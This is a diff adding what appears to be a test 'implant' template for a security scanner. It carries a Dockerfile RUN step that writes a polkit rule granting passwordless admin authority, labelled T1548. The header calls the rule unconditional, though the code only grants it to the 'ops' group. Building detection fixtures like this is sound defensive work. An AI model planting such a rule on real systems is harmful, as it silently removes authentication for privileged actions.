@@ -1,0 +1,19 @@
+# Implant template: polkit-yes-allow (L3, armed)
+#
+# T1548 (Abuse Elevation Control Mechanism). Drops a polkit JS rule that
+# unconditionally returns polkit.Result.YES, granting any caller admin
+# authority (e.g. systemctl, mount, NetworkManager) without a password.
+# The polkit module fires polkit_yes_constant + polkit_admin_rule.
+#
+# Variables: ${rules_file}
+
+RUN mkdir -p /etc/polkit-1/rules.d && \
+    printf '%s\n' \
+        'polkit.addRule(function(action, subject) {' \
+        '    if (subject.isInGroup("ops")) {' \
+        '        return polkit.Result.YES;' \
+        '    }' \
+        '});' \
+        > ${rules_file} && \
+    chown root:root ${rules_file} && \
+    chmod 0644 ${rules_file}
